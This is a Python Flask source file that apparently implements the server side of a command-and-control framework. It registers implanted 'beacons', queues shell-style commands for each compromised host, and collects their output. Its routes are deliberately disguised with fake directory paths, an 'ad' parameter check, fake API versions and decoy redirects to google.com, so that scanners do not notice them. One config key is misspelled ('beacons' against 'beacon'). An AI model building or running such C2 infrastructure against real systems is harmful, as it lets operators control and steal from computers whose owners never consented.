from flask import Flask, request, jsonify, redirect, send_from_directory
import uuid
import time
import logging
from flask_socketio import SocketIO
from Modules.global_objects import (
    beacons, add_beacon_list, beacon_commands, config)


beaconControl = Flask(__name__)
socketio = SocketIO(beaconControl, cors_allowed_origins="*")
log = logging.getLogger('werkzeug')
beaconControl.logger.setLevel(logging.ERROR)
log.setLevel(logging.ERROR)


"""
This is used for the connection request, it requires the following parameters:
    - part1 + part2 are random strings/ fake directories
    - ad_param is a string that contains the word "ad"
    - hard coded param API
    - version is an integer between 1 and 10
If the parameters are not met or the data is not in the correct format,
it will return a 404
"""


@beaconControl.route('/<part1>/<part2>/<ad_param>/api/v<int:version>', methods=['POST'])
def connectionRequest(part1, part2, ad_param, version):
    if "ad" not in ad_param or version not in range(1, 11):
        return '', 404
    data = request.get_json()
    if data and 'name' in data and 'os' in data and 'address' in data:
        name = data['name']
        os = data['os']
        address = data['address']
        userID = str(uuid.uuid4())
        add_beacon_list(userID, address, name,
                        os, time.asctime(),
                        config['beacon']["interval"],
                        config['beacon']['jitter'])
        socketio.emit('new_connection', {'uuid': userID, 'name': name, 'os': os, 'address': address, "interval": config['beacon']["interval"], "jitter": config['beacon']['jitter']})
        return {"timer": config['beacon']["interval"],
                "uuid": userID, "jitter": config['beacon']['jitter']}, 200
    else:
        return redirect("https://www.google.com", code=302)


"""
This is used for the reconnection request if the client looses
connection to the server.
It requires the following parameters:
    - part1 is a random string/ fake directory
    - ad_param is a string that contains the word "ad"
    - hard coded param getLatest
If the parameters are not met or the data is not in the correct format,
it will return a 404
"""


@beaconControl.route('/<part1>/<ad_param>/getLatest', methods=['POST'])
def reconect(part1, ad_param):
    if "ad" not in ad_param:
        return '', 404
    data = request.get_json()

    name = data["name"]
    os = data["os"]
    address = data["address"]
    ID = data["id"]
    timer = data["timer"]
    jitter = data["jitter"]

    if name and os and address and ID and timer and jitter:
        add_beacon_list(ID, address, name, os, time.asctime(),
                        float(timer), float(jitter))
        return {"timer":
                config["beacons"]["interval"],
                "uuid": ID,
                "jitter": config["beacon"]["jitter"]}, 200
    else:
        return '', 404


@beaconControl.route('/checkUpdates/<part1>/<part2>', methods=['GET'])
def beacon(part1, part2):
    data = {}
    id = request.args.get('session')
    if not id:
        return '', 400

    user_ids = beacons.get("uuid", [])
    for i, beacon_id in enumerate(user_ids):
        if beacon_id == id:
            beacons["last_beacon"][i] = time.asctime()
            timer = beacons["timer"][i]
            jitter = beacons["jitter"][i]
            next_beacon_time = time.time() + timer
            beacons["next_beacon"][i] = time.asctime(
                time.localtime(next_beacon_time))

            # Emit countdown update via SocketIO
            socketio.emit('countdown_update', {
                'uuid': id,
                'timer': timer,
                'jitter': jitter,
            })

    for j in range(len(beacon_commands["beacon_uuid"])):
        if beacon_commands["executed"][j]:
            continue
        if beacon_commands["beacon_uuid"][j] == id:
            data["command_uuid"] = beacon_commands["command_uuid"][j]
            data["command"] = beacon_commands["command"][j]
            beacon_commands["executed"][j] = True

    if not data:
        data["none"] = "none"
    return jsonify(data), 200


@beaconControl.route('/updateReport/<path1>/api/v<int:version>', methods=['POST'])
def response(path1, version):
    if version not in range(1, 11):
        return '', 404
    output = request.get_json().get('output', '')
    cid = request.get_json().get('command_uuid', '')
    found = False
    for i, command_uuid in enumerate(beacon_commands["command_uuid"]):
        if cid == command_uuid:
            found = True
            if i < len(beacon_commands["command_output"]):
                beacon_commands["command_output"][i] = output
                print(
                    f"Command {beacon_commands['beacon_uuid'][i]} ",
                    "responded with:"
                )
                print(output)
            else:
                print(
                    f"Index {i} out of range for ",
                    f"{beacon_commands['command_output']}"
                )
    if not found:
        return '', 500
    return '', 200
